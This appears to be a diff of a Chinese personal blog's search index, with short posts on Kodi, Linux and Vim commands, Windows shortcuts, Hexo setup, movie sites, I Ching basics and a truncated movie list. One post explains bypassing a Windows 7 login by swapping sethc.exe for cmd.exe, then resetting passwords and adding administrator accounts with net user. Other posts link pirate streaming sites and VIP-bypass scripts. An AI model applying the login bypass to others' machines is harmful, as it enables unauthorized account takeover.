+      <link href="/2022/03/05/KODI%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C%E4%BD%8D%E7%BD%AE/"/>
+      <url>/2022/03/05/KODI%E8%AE%BF%E9%97%AE%E7%BD%91%E7%BB%9C%E4%BD%8D%E7%BD%AE/</url>
+      
+        <content type="html"><![CDATA[<h2 id="KODI访问网络位置"><a href="#KODI访问网络位置" class="headerlink" title="KODI访问网络位置"></a>KODI访问网络位置</h2><h3 id="计算机开启SMB服务"><a href="#计算机开启SMB服务" class="headerlink" title="计算机开启SMB服务"></a>计算机开启SMB服务</h3><ol><li>网络和Internet——&gt;网络和共享中心——&gt;高级共享设置——&gt;启用网络发现和文件&#x2F;打印机<br>所有网络——&gt;公用文件夹共享——&gt;启用共享  </li><li>右键我的电脑——&gt;管理——&gt;本地用户和组——&gt;用户——&gt;右键新建用户——&gt;配置用户名密码  </li><li>选中共享文件夹——&gt;右键属性——&gt;共享——&gt;添加新建用户名——&gt;配置权限——&gt;共享<h3 id="KODI添加视频源"><a href="#KODI添加视频源" class="headerlink" title="KODI添加视频源"></a>KODI添加视频源</h3></li><li>设置——&gt;Interface——&gt;SKIN——&gt;Fonts——&gt;Arial,Regional——&gt;Language——&gt;中文</li><li>电影——&gt;进入文件区——&gt;添加视频——&gt;浏览——&gt;添加网络位置——&gt;服务器名称填计算机IP——&gt;填写用户名密码<h3 id="KODI添加直播源"><a href="#KODI添加直播源" class="headerlink" title="KODI添加直播源"></a>KODI添加直播源</h3></li><li>插件——&gt;下载——&gt;安装PVR IPTVSimple Client<br> 插件——&gt;我的插件——&gt;PVR客户端——&gt;PVR IPTVSimple Client——&gt;设置——&gt;填写m3u播放列表URL</li><li>直播源URL：<a href="https://github.com/iptv-org/iptv">https://github.com/iptv-org/iptv</a></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 影音娱乐 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> kodi </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux命令</title>
+      <link href="/2022/03/05/Linux%E5%91%BD%E4%BB%A4/"/>
+      <url>/2022/03/05/Linux%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><pre class="line-numbers language-none"><code class="language-none">lspwd     当前路径cdmkdirtouch   创建文件cat     打开文件&#x2F;合并文件cpmvrm&gt;       输出重定向，覆盖&gt;&gt;      输出重定向，追加，不覆盖less    查看文件内容more    查看文件内容tree    以树形结构显示目录内容wc Filename     统计文件内容信息（行数，单词数，字节数）      -l      -w      -chead Filename   查看文件前n行      -n          n行，不加参数默认10行tail Filename   查看文件末n行，动态查看文件内容​      -n          n行      -f          动态显示文件添加内容du      查看目录大小      -s  显示汇总大小      -h  可读性提升find    查找文件      +路径      -name filename 根据名称搜索      -type typename 根据类型搜索(类型：f 文件 d 目录) which   查找二进制命令 chmod   改变文件或目录权限chown   改变文件或目录所属主和属组chattr  改变文件的扩展属性lsattr  查看文件的扩展属性file    显示文件类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><pre class="line-numbers language-none"><code class="language-none">df          查看磁盘空间 du同     -h      可读性提高free        查看内存剩余      -m      以m为单位ps          查看进程      -e      查看所有进程      -f      查看所有进程所有信息top         动态查看系统运行情况  uname       显示操作系统相关信息hostname    显示或者设置当前系统的主机名dmesg       显示开机信息，用于诊断系统故障type        判断命令是否是内置命令export      设置或者显示环境变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进程相关"><a href="#进程相关" class="headerlink" title="进程相关"></a>进程相关</h3><pre class="line-numbers language-none"><code class="language-none">service     启，停，重启，关闭服务，显示服务状态bg          启动在后台暂停运行的命令fg          将后台运行的命令调至前台jobs        查看后台运行的命令kill        终止进程pkill       通过进程名中止进程nohup       在系统后台不挂断地运行命令，退出终端不影响pgrep       查找匹配条件的进程&amp;           后台运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统用户登陆信息"><a href="#系统用户登陆信息" class="headerlink" title="系统用户登陆信息"></a>系统用户登陆信息</h3><pre class="line-numbers language-none"><code class="language-none">whoami    显示当前有效的用户名称，相当于执行 id -un 命令who        显示目前登录系统的用户信息w        显示已经登陆系统的用户列表，并显示用户正在执行的指令last    显示登入系统的用户lastlog    显示系统中所有用户最近一次登录信息users    显示当前登录系统的所有用户的用户列表finger    查找并显示用户信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h4><pre class="line-numbers language-none"><code class="language-none">kill        杀死进程      +PIDdate        读取&#x2F;设置时间，CST中国时间      +%F     输出格式：2020-01-01      “%Y-%m-%d” 同上      “+%F %T” 输出格式：2021-05-31 23:16:20cal         日历  year        输出指定年的日历      -y      一年的日历，默认当月      -num    num为数值，前n个月的日历      -s&#x2F;m    以周六或周一作第一天hostname    查看、修改(临时)主机名      -f      FQDN全限定域名uptime      系统运行时间uname       获取操作系统类型      -a      查看详细系统信息shutdown    关机 &#x3D;init 0,halt,poweroff      -h time 指定时间关机reboot      重启man         帮助手册      +command查看指定命令的帮助信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre class="line-numbers language-none"><code class="language-none">ifconfig    查看，配置网络接口ifup        启动网卡ifdown      关闭网卡pingnetstat     查看网络连接状态      -l      Listen状态      -t      Tcp协议      -u      Udp协议      -n      IP地址+端口号      -p      列出PIDnslookuptraceroute&#x2F;tracertarp  IPAddress   通过ip地址查询mac地址      -a      查询      -d      删除route       显示和设置linux系统的路由表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://man.linuxde.net/">Linux命令手册在线版</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> IT </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Vim基础使用</title>
+      <link href="/2022/03/05/Vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
+      <url>/2022/03/05/Vim%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Vim基础使用"><a href="#Vim基础使用" class="headerlink" title="Vim基础使用"></a>Vim基础使用</h2><h3 id="Vim三种模式"><a href="#Vim三种模式" class="headerlink" title="Vim三种模式"></a>Vim三种模式</h3><ol><li><p>Command mode<br>默认命令模式 gg G dd(删除) ndd(n为数字) yy(复制) cc(剪切) p(粘贴) u(撤销)</p></li><li><p>Insert mode<br>插入模式 a i o进入 &#x2F;&#x2F;操作前按下数字n，操作后重复n次</p><table><thead><tr><th align="center">命令</th><th align="center">功能</th><th align="center">命令</th><th align="center">功能</th><th align="center">命令</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">i</td><td align="center">当前字符前插入</td><td align="center">a</td><td align="center">当前字符后插入</td><td align="center">o</td><td align="center">下一行插入空行</td></tr><tr><td align="center">I</td><td align="center">行首插入</td><td align="center">A</td><td align="center">行末插入</td><td align="center">O</td><td align="center">上一行插入空行</td></tr></tbody></table></li><li><p>Last Line mode<br>底线命令模式 :wq :q :q! :x(保存退出)</p><table><thead><tr><th align="center">命令</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">:wq</td><td align="center">保存退出，+!强制执行write quite，+filename另存为</td></tr><tr><td align="center">:x</td><td align="center">保存退出</td></tr><tr><td align="center">:e</td><td align="center">浏览当前目录下的文件</td></tr><tr><td align="center">:n filename</td><td align="center">新建文件并打开</td></tr><tr><td align="center">:w filename</td><td align="center">保存当前文件到另一个文件，阶段性备份</td></tr></tbody></table></li></ol><h3 id="光标移动-命令模式"><a href="#光标移动-命令模式" class="headerlink" title="光标移动(命令模式)"></a>光标移动(命令模式)</h3><table><thead><tr><th align="center">命令</th><th align="center">简拼</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">hjkl</td><td align="center">方向键</td><td align="center">左下上右</td></tr><tr><td align="center">w</td><td align="center">word</td><td align="center">向后移动一个单词</td></tr><tr><td align="center">b</td><td align="center">back</td><td align="center">向前移动一个单词</td></tr><tr><td align="center">^</td><td align="center"></td><td align="center">跳转到行首</td></tr><tr><td align="center">$</td><td align="center"></td><td align="center">跳转到行尾</td></tr><tr><td align="center">gg</td><td align="center">go</td><td align="center">跳转到首行，ngg跳转到第n行</td></tr><tr><td align="center">G</td><td align="center"></td><td align="center">跳转到末行</td></tr><tr><td align="center">Ctrl+b</td><td align="center">back</td><td align="center">向上翻页</td></tr><tr><td align="center">Ctrl+f</td><td align="center">forward</td><td align="center">向下翻页</td></tr><tr><td align="center">{</td><td align="center"></td><td align="center">跳转到上一段落，以空行识别</td></tr><tr><td align="center">}</td><td align="center"></td><td align="center">跳转到下一段落</td></tr><tr><td align="center">mx-&gt;’x</td><td align="center"></td><td align="center">添加标记点，x是a-z任意字母，回到标记(单引号)</td></tr></tbody></table><h3 id="编辑文本"><a href="#编辑文本" class="headerlink" title="编辑文本"></a>编辑文本</h3><h4 id="1-选中文本-可视模式"><a href="#1-选中文本-可视模式" class="headerlink" title="1. 选中文本(可视模式)"></a>1. 选中文本(可视模式)</h4><ul><li>v 正常选中</li><li>V 整行选中</li><li>Ctrl+v 选中列<h4 id="2-编辑-命令-x2F-可视模式"><a href="#2-编辑-命令-x2F-可视模式" class="headerlink" title="2. 编辑(命令&#x2F;可视模式)"></a>2. 编辑(命令&#x2F;可视模式)</h4></li><li>u 撤销操作</li><li>Ctrl+r 恢复撤销</li><li>x 删除字符，nx删除n个字符</li><li>d d+移动命令，删除选中字符，delete</li><li>dd 删除整行，ndd删除n行</li><li>D 删除光标到行末所有字符</li><li>y y+移动命令，复制 copy</li><li>yy 复制整行，nyy复制n行</li><li>p 粘贴，paste</li><li>r 替换单个字符，r+需要替换的字母</li><li>R 替换单词，r+需要替换的单词<h4 id="3-查找-x2F-替换-命令-x2F-底线模式"><a href="#3-查找-x2F-替换-命令-x2F-底线模式" class="headerlink" title="3. 查找&#x2F;替换(命令&#x2F;底线模式)"></a>3. 查找&#x2F;替换(命令&#x2F;底线模式)</h4></li><li>&#x2F;str 查找，n:下一个 N:上一个</li><li>*or# 向后或向前查找光标所在单词</li><li>:%s&#x2F;old&#x2F;new&#x2F;g 全局替换，gc：替换前需确认（推荐）yes no all quit</li><li>:s&#x2F;old&#x2F;new&#x2F;g 可视范围替换（进入可视模式）</li></ul><h3 id="实用操作"><a href="#实用操作" class="headerlink" title="实用操作"></a>实用操作</h3><h4 id="分屏操作"><a href="#分屏操作" class="headerlink" title="分屏操作"></a>分屏操作</h4><table><thead><tr><th align="center">命令</th><th align="center">简拼</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">:sp filename</td><td align="center">split</td><td align="center">横向分屏</td></tr><tr><td align="center">:vsp felename</td><td align="center">vertical</td><td align="center">纵向分屏</td></tr><tr><td align="center">Ctrl+w+w</td><td align="center">window</td><td align="center">切换到下一窗口</td></tr><tr><td align="center">Ctrl+w+r</td><td align="center">reverse</td><td align="center">交换窗口位置</td></tr><tr><td align="center">Ctrl+w+c</td><td align="center">close</td><td align="center">关闭当前窗口，不关闭最后一个窗口</td></tr><tr><td align="center">Ctrl+w+q</td><td align="center">quit</td><td align="center">退出当前窗口</td></tr><tr><td align="center">Ctrl+w+o</td><td align="center">other</td><td align="center">关闭其它窗口</td></tr></tbody></table><h4 id="批量注释"><a href="#批量注释" class="headerlink" title="批量注释"></a>批量注释</h4><ul><li>Ctrl+v –&gt; I,A(只能用大写) –&gt; 插入内容 –&gt;Esc<h4 id="统一缩进"><a href="#统一缩进" class="headerlink" title="统一缩进"></a>统一缩进</h4></li><li>&gt;&gt; 向右缩进四个空格，配合可视模式使用</li><li>&lt;&lt; 向左缩进四个空格</li><li>. 重复命令</li></ul><h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><ol><li>下载vim-plug目录下plug.vim文件，放到autoload&#x2F;目录下 <a href="https://github.com/junegunn/vim-plug">github地址</a></li><li>.vimrc配置文件<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">call plug#begin()Plug 'scrooloose/nerdtree',&#123; 'on':  'NERDTreeToggle'&#125; 例call plug#end()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>进入vim底线命令行模式<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">:PlugStatus#查看插件状态:PlugInstall#安装插件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>插件网站推荐:<a href="https://vimawesome.com/">vimawesome.com</a></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> IT </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vim </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Win7登录密码重置</title>
+      <link href="/2022/03/05/Win7%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
+      <url>/2022/03/05/Win7%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Win7登录密码重置"><a href="#Win7登录密码重置" class="headerlink" title="Win7登录密码重置"></a>Win7登录密码重置</h2><ol><li>确认可行性：<br>登录界面连按5次shift，弹出粘滞界面<br>意外关机后重启，有启动修复选项</li><li>修改 程序为cmd<br>弹出启动修复程序框，打开隐藏问题<br>下拉，打开本地文件.txt<br>file-&gt;打开C:\windows\system32\<br>文件类型选所有文件<br>找到sethc.exe,重命名（1122）<br>找到cmd.exe 多次复制，粘贴出 cmd副本.exe ,重命名为sethc<br>关机重启</li><li>cmd实现密码重置   <pre class="line-numbers language-none"><code class="language-none">net user UserName NewPw  设置新密码net user NewUn NewPw &#x2F;add  创建新用户net localgroup administrators username &#x2F;add  提升管理员权限net user UserName &#x2F;del 删除用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> shift </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows快捷键</title>
+      <link href="/2022/03/05/Windows%E5%BF%AB%E6%8D%B7%E6%93%8D%E4%BD%9C/"/>
+      <url>/2022/03/05/Windows%E5%BF%AB%E6%8D%B7%E6%93%8D%E4%BD%9C/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Windows快捷操作"><a href="#Windows快捷操作" class="headerlink" title="Windows快捷操作"></a>Windows快捷操作</h2><h3 id="运行快捷指令"><a href="#运行快捷指令" class="headerlink" title="运行快捷指令"></a>运行快捷指令</h3><pre class="line-numbers language-none"><code class="language-none">Win+R:cmdDOS命令行界面control控制面板regedit打开注册表calc计算器notepad记事本taskmgr任务管理器osk虚拟键盘mspaint画图工具magnify放大镜cleanmgr磁盘清理winver查看Windows版本ncpa.cpl网络连接管理explorer资源管理器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><pre class="line-numbers language-none"><code class="language-none">Win + R打开运行窗口Space切换输入法D返回桌面E资源管理器I设置界面M最小化所有窗口shift+M还原最小化的窗口L快速锁屏←→分屏↑↓放大缩小num(1,2,3..)打开任务栏第N个程序V剪贴板home最小化所有非当前窗口Ctrl +A全选F查找关键字X&#x2F;C&#x2F;V剪切&#x2F;复制&#x2F;粘贴Z撤销操作Y恢复上一步操作Shift+N新建文件夹Tab切换页面num切换到第N个页面N新建页面Shift+Esc任务管理器浏览器：R刷新页面T新建标签页W关闭页面shift+T恢复关闭的网页Tab同上num同上L光标定位到地址栏Shift + Delete删除文件，不放入回收站←→拉选文本Alt +Enter查看文件属性F4关闭应用Tab切换应用←→后退&#x2F;前进页面F数字区F2重命名F5刷新F11全屏F12浏览器审查元素&#x2F;调试界面PRTSC截屏，Ctrl+v应用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> PC </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 快捷键 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>个人博客搭建</title>
+      <link href="/2022/03/05/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
+      <url>/2022/03/05/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
+      
+        <content type="html"><![CDATA[<h2 id="个人博客搭建"><a href="#个人博客搭建" class="headerlink" title="个人博客搭建"></a>个人博客搭建</h2><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><pre class="line-numbers language-none"><code class="language-none">gitnodejs 检测：node -v npm -v(node安装已包含)hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="连接Github"><a href="#连接Github" class="headerlink" title="连接Github"></a>连接Github</h3><pre class="line-numbers language-none"><code class="language-none">git config --global user.name &quot;username&quot;git config --global user.email &quot;email&quot;ssh -T git@github.com 远程测试连接github仓库ssh-keygen -t rsa -C &quot; &quot; 一路回车，生成密钥复制到Github新建key中ssh -T git@github.com 远程测试连接github仓库github，Settings-&gt;Developer settings-&gt;Personal access tokens-&gt;Generate new token1. 填写note，勾选select scopes下的repo选项，提交生成一串口令，复制2. hexo d 部署，过程中填写note内容和口令，username，passwordgit clone https:&#x2F;&#x2F;github... 从github上下载主题包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h3><pre class="line-numbers language-none"><code class="language-none">npm install -g hexo-cli 安装hexonpm install hexo-deployer-git --save git部署插件安装hexo init 新建文件夹下初始化hexohexo clean&#x2F;generate&#x2F;server&#x2F;deploy 清除缓存&#x2F;生成静态页面&#x2F;运行本地服务&#x2F;部署到服务器hexo new &quot;filename&quot; 新建文章hexo new page &quot;pageame&quot; 新建页面hexo help 查看帮助修改全局配置文件文件应用主题和hexo配置deploy:type: gitrepository: https:&#x2F;&#x2F;github.com&#x2F;HHB0SS&#x2F;HHB0SS.github.iobranch: masterhexo g -d  部署到github<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h3><pre class="line-numbers language-none"><code class="language-none">_config.yml 全局配置文件hexoblog&#x2F;source&#x2F;_posts&#x2F; 文章内容themes&#x2F;..&#x2F;_config.yml  主题配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="部署失败解决"><a href="#部署失败解决" class="headerlink" title="部署失败解决"></a>部署失败解决</h3><pre class="line-numbers language-none"><code class="language-none">case1：删除.dploy_git文件夹git config --global core.autocrlf falsehexo cleanhexo g -dcase2：Token失效，修改其有效期Develop Settings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> IT </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>影视网站</title>
+      <link href="/2022/03/05/%E5%BD%B1%E8%A7%86%E7%BD%91%E7%AB%99/"/>
+      <url>/2022/03/05/%E5%BD%B1%E8%A7%86%E7%BD%91%E7%AB%99/</url>
+      
+        <content type="html"><![CDATA[<h2 id="影视网站"><a href="#影视网站" class="headerlink" title="影视网站"></a>影视网站</h2><h3 id="导航类"><a href="#导航类" class="headerlink" title="导航类"></a>导航类</h3><p><a href="http://www.549.tv/">影视森林</a><br><a href="http://dev.rubaoo.com/TimeDiaryV2/s/Zzg=">大傻子网址收藏</a></p><h3 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h3><ul><li><a href="https://www.cupfox.com/">茶杯狐</a>  </li><li><a href="https://www.ysgc.tv/">影视工厂</a></li><li><a href="https://www.o8tv.com/">555电影</a></li><li><a href="https://www.novipnoad.com/">NOvip</a></li><li><a href="https://v.lree.cn/">牛逼影院</a></li><li><a href="https://www.yyets.com/">人人影视</a></li><li><a href="https://www.btnull.re/">片库</a>暂不可用  </li><li><a href="http://www.kuhuiv.com/">酷绘</a></li></ul><h3 id="下载网站"><a href="#下载网站" class="headerlink" title="下载网站"></a>下载网站</h3><p><a href="https://m.dytt8.net/index2.htm">电影天堂</a> <a href="https://www.bd2020.co/">BD影视</a></p><h3 id="美剧"><a href="#美剧" class="headerlink" title="美剧"></a>美剧</h3><p><a href="https://m.99meiju.net/">99美剧网</a> <a href="https://www.imeiju.pro/">爱美剧</a><br><a href="https://www.movieffm.net/">电影在线看</a></p><h3 id="动漫"><a href="#动漫" class="headerlink" title="动漫"></a>动漫</h3><p><a href="https://halihali7.com/">哈哩哈哩</a><br><a href="http://www.yinghuacd.com/">樱花动漫</a><br><a href="https://www.bimiacg4.net/">哔咪动漫</a></p><h3 id="网页观影"><a href="#网页观影" class="headerlink" title="网页观影"></a>网页观影</h3><p>使用Edge，Chrome，Firefox，等主流浏览器<br>安装暴力猴插件管理器<br>点击暴力猴图标，点击为此站点查找脚本<br>安装视频网站解析插件，可实现无vip观影</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 影音娱乐 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cupfox </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>手机软件</title>
+      <link href="/2022/03/05/%E6%89%8B%E6%9C%BA%E8%BD%AF%E4%BB%B6/"/>
+      <url>/2022/03/05/%E6%89%8B%E6%9C%BA%E8%BD%AF%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<h2 id="手机软件"><a href="#手机软件" class="headerlink" title="手机软件"></a>手机软件</h2><h3 id="软件商店"><a href="#软件商店" class="headerlink" title="软件商店:"></a>软件商店:</h3><pre class="line-numbers language-none"><code class="language-none">酷安应用汇<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="科学上网："><a href="#科学上网：" class="headerlink" title="科学上网："></a>科学上网：</h3><pre class="line-numbers language-none"><code class="language-none">老王VPN（Google软件必备）小飞机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="电子书："><a href="#电子书：" class="headerlink" title="电子书："></a>电子书：</h3><pre class="line-numbers language-none"><code class="language-none">搜书大师阅读<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="小工具："><a href="#小工具：" class="headerlink" title="小工具："></a>小工具：</h3><pre class="line-numbers language-none"><code class="language-none">MemoWidget（桌面便签）DroidCam（电脑调用手机摄像头、麦克风）Xmind（思维导图）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Memo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>易经基础知识</title>
+      <link href="/2022/03/05/%E6%98%93%E7%BB%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+      <url>/2022/03/05/%E6%98%93%E7%BB%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="易经基础知识"><a href="#易经基础知识" class="headerlink" title="易经基础知识"></a>易经基础知识</h2><h3 id="易经三个原则"><a href="#易经三个原则" class="headerlink" title="易经三个原则"></a>易经三个原则</h3><ol><li>变易：变动不居，周流六虚</li><li>简易：大道至简</li><li>不易：易之本体，变是不变<h3 id="八卦"><a href="#八卦" class="headerlink" title="八卦"></a>八卦</h3>乾坤震艮离坎兑巽  </li><li>伏羲八卦（先天八卦）  </li><li>文王八卦（后天八卦）<br><img src="/2022/03/05/%E6%98%93%E7%BB%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%85%88%E5%90%8E%E5%A4%A9%E5%85%AB%E5%8D%A6.jpeg" alt="先后天八卦"><h3 id="六十四卦"><a href="#六十四卦" class="headerlink" title="六十四卦"></a>六十四卦</h3></li></ol><p>《上下经卦名次序歌》<br>乾坤屯蒙需讼师， 比小畜兮履泰否，<br>同人大有谦豫随， 蛊临观兮噬嗑贲，<br>剥复无妄大畜颐， 大过坎离三十备。<br>咸恒遁兮及大壮， 晋与明夷家人睽，<br>蹇解损益夬姤萃， 升困井革鼎震继，<br>艮渐归妹丰旅巽， 兑涣节兮中孚至，<br>小过既济兼未济， 是为下经三十四。<br>《分宫卦象次序歌》<br>乾为天，天风姤，天山遁，天地否，风地观，山地剥，火地晋，火天大有。<br>坎为水，水泽节，水雷屯，水火既济，泽火革，雷火丰，地火明夷，地水师。<br>艮为山，山火贲，山天大畜，山泽损，火泽睽，天泽履，风泽中孚，风山渐。<br>震为雷，雷地豫，雷水解，雷风恒；地风升，水风井，泽风大过，泽雷随。<br>巽为风，风天小畜，风火家人，风雷益，天雷无妄，火雷噬嗑，山雷颐，山风蛊。<br>离为火，火山旅，火风鼎，火水未济，山水蒙，风水涣，天水讼，天火同人。<br>坤为地，地雷复，地泽临，地天泰，雷天大壮，泽天夬，水天需，水地比。<br>兑为泽，泽水困，泽地萃，泽山咸，水山蹇，地山谦，雷山小过，雷泽归妹。</p><h3 id="天干地支"><a href="#天干地支" class="headerlink" title="天干地支"></a>天干地支</h3><p>十天干：甲（jiǎ）、乙（ yǐ）、丙（bǐng）、丁（dīng）、戊（wù）、己（jǐ）、庚（gēng）、辛（xīn）、壬（rén）、癸（guǐ）。<br>十二地支：子（zǐ）、丑（chǒu）、寅（yín）、卯（mǎo）、辰（chén）、巳（sì）、午（wǔ）、未（wèi）、申（shēn）、酉（yǒu）、戌（xū）、亥（hài）。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 古典文学 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 易 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电影收录</title>
+      <link href="/2022/03/05/%E7%94%B5%E5%BD%B1%E6%94%B6%E5%BD%95/"/>
+      <url>/2022/03/05/%E7%94%B5%E5%BD%B1%E6%94%B6%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<h2 id="电影收录"><a href="#电影收录" class="headerlink" title="电影收录"></a>电影收录</h2><h3 id="大陆："><a href="#大陆：" class="headerlink" title="大陆："></a>大陆：</h3><pre class="line-numbers language-none"><code class="language-none">《无间道123》《让子弹飞》《邪不压正》《黄飞鸿》《赛德克·巴莱》《狄仁杰》 《夏洛特烦恼》《枪火1》《智取威虎山》《心迷宫》《无人区》《杀生》《不成问题的问题》《十二公民》《盲山》《私人订制》《边境风云》《天注定》《新宿事件》《罗曼蒂克的消亡史》《爆裂无声》《智取威虎山》《天注定》《上海皇帝》《烈日灼心》《南方车站的聚会》<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="台湾"><a href="#台湾" class="headerlink" title="台湾"></a>台湾</h3><pre class="line-numbers language-none"><code class="language-none">《大佛普拉斯》《血观音》《阳光普照》<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="韩国："><a href="#韩国：" class="headerlink" 